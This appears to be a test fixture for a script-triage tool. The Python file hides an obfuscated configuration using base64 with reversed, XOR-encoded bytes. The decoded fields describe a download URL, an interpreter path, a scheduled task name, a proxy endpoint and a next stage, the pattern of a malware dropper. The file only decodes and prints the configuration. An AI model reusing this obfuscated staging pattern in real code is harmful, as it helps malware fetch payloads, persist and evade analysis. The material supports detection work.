# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_2171e831 = ("I2FiPHd+Yn9zYT93cWBnfWF3YC93dXNmYU1mand8biciIiIhKCM8IjwiPCUgIy9mfHt9YnZ8d01ran1gYm53cXQncyMnJHN3P3dmc3ZiR393ZmFrQS93f3N8TXlhc2Zud2p3PHx9emZrYj13cXQncyMnJHN3P3x9emZrQj1zZnNWf3NgdX1gQj0oUS96ZnNiTW"
    "B3ZndgYmB3Znx7bmtiPHdxdCdzIyckc3c/d2ZzdmJnPD1wc15hYXdgZnxnWj1zZnNWf3NgdX1gQj0oUS96ZnNiTXd+e3Rud3F0J3MjJyRzdz18fXpma0JhYXdgZnxnWi9mfHd1c01gd2FnbmtiPHArJyEgI3R3PXZ7fnNkfHs8d35if3Nqdzx3cXQncyMnJHN3"
    "PT0oYWJmZnovfmBnbndxdCdzIyckc3c/fHV7c2J/c3EvdntNfHV7c2J/c3FuYH1mYntgcWF3dk13cXtkYHdhL3x7c3pxTWFlfXZ8e2Vud3F7ZGB3YU1hZX12fHtlTXdqdyBrYi9gd3tgYHNxbnV8e2ZnfWBNfH17ZmJ3cWp3L3x9e2ZzcWFndHB9bnV8e3Z8e3"
    "BNYWdgfnNlL2pzZnxrYW4nL2Z8Z31xTXd1c2ZhbnR0fXZ8c3pNd35rZmFNfH16ZmtifH1gey9gd2Zic3ZzbmFhd3F9YGJNenFmc2Jhe3Y+d357dE13ZntgZT52d3Z2d3B/d013dn1xd3Y+d2Z9f3dgTXdge2djcXM+ZmF9ek13fnt0fWBiL2Fid2ZhbiAvZA==")
CODEC_2171e831 = "base64_chunks|reverse_then_xor|12"

def load_2171e831():
    return base64.b64decode(MATERIAL_2171e831)

def decode_2171e831(item1):
    return bytes(value ^ 18 for value in reversed(item1))

def recover_2171e831():
    item4 = "left" if 2 > 1 else "right"
    try:
        item2 = decode_2171e831(load_2171e831())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_2171e831():
    return recover_2171e831()

def surface_2171e831():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_2171e831():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_2171e831():
    fields = dict(item.split("=", 1) for item in inspect_2171e831().split("|"))
    analysis_surface = surface_2171e831()
    obfuscation_surface = obfuscation_2171e831()
    operation_plan = ("ironpython_style_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_2171e831())

# reconstruction complete